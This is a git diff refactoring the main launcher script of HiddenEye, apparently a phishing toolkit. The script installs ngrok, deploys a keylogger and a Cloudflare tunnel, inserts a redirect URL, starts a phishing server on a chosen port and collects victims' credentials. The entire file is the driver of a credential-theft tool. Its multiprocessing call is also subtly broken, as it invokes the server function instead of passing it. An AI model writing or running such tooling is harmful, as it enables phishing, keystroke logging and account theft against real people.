@@ -1,42 +1,45 @@
 #!/usr/bin/python3
 #
-#HiddenEye by Open Source Community
+# HiddenEye by Open Source Community
 #
 import multiprocessing
 import gettext
+from os import system, environ
 import sys
-from Defs.Checks import *
-from Defs.Configurations import *
-from Defs.Actions import *
-from Defs.Languages import *
-from os import system
+import ssl
+
+from Defs.Checks import ConnectionManager, PermissionsManager
+from Defs.Configurations import ConfigurationManager
+from Defs.Actions import ActionsManager, EssentialsManager, ServerManager
+# from Defs.Languages import * #TODO LANGUAGE WILL BE IMPLEMENTED LATER
+
 
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
-checkPermissions()
-installGetText()
-languageSelector()
-checkConnection()
-checkNgrok()
-ifSettingsNotExists()
-readConfig()
+PermissionsManager.checkPermissions()
+ConnectionManager.verifyNetHunterConnection()
+ConnectionManager.confirmConnection()
+ServerManager.installNgrok()
+ConfigurationManager.confirmSettingsExistence()
+ConfigurationManager.readConfig()
 
 
 if __name__ == "__main__":
     try:
-        runMainMenu()
-        mainMenu()
-        
-        keyloggerprompt()
-        addingkeylogger()
-       
-        inputCustom()
-        ##############
-        runServer()
-        selectServer()
+        ActionsManager.runMainMenu()
+        EssentialsManager.mainMenu()
 
-        multiprocessing.Process(target=runServer).start()
-        getCredentials()
+        ActionsManager.deployKeylogger()
+        ActionsManager.deployCloudfare()
+        ActionsManager.insertRedirectingURL()
+        port = ActionsManager.selectPort()
+
+        ServerManager.runServer(port)
+        ServerManager.selectServer(port)
+
+        multiprocessing.Process(
+            target=ServerManager.runServer(port), args=(port,)).start()
+        ActionsManager.getCredentials(port)
 
     except KeyboardInterrupt:
-        endMessage()
+        EssentialsManager.endMessage()
         exit(0)
